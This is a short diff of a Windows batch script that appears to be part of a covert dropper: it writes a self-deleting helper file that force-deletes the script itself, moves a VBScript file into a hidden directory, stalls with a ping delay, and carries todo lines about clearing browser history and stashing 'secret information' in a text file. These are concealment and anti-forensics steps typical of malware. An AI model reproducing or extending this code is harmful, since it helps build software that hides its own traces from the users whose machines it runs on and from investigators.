@@ -47,26 +47,24 @@ if not exist "%HD%" (
 )
 
 :: set the path to the deletion script
-set DEL_SCRIPT=%APPDATA%\Firewall\.del.bat
+set SCRIPT_PATH=%~f0
 
 :: create txt file
 echo "lol" > %HD%\%NAME%.txt
-echo del /f /q "%~f0" > %HD%\.del.bat
+echo del /f /q "%SCRIPT_PATH%" > "%HD%\.del.bat"
 
 echo.
 echo.
 echo.
-
-echo worked
 
 echo todo: clear browser history
 
 echo todo: use %HD%\%NAME%.txt for secret information
 
-ping 127.0.0.1 -n 36 > nul
-
 echo run del.bat after script config.cmd exit
-echo %HD%\del.bat
+echo '%HD%\del.bat'
+
+ping 127.0.0.1 -n 36 > nul
 
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
